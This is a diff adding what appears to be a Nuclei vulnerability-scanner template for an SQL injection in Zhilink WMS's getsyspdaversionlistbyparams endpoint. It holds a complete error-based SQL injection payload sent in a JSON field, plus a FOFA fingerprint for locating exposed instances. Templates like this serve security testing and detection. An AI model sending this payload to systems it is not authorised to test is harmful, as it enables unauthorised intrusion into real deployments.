@@ -1,0 +1,44 @@
+id: zhilink-getsyspdaversionlistbyparams-sqli
+info:
+  name: Zhilink WMS getsyspdaversionlistbyparams SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    description: |
+      SQL injection vulnerability in Zhilink WMS getsyspdaversionlistbyparams endpoint.
+    finger: Zhilink WMS
+    fofa: icon_hash="155833598"
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "condition": {
+          "field": "createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,md5({{t1}}),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)",
+          "order": "asc"
+        },
+        "current": 1,
+        "size": 1
+      }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "SQLState"
+          - "java.sql.SQL"
+          - "\"duration\":"
+          - "Internal Server Error"
+          - "{{t2}}"
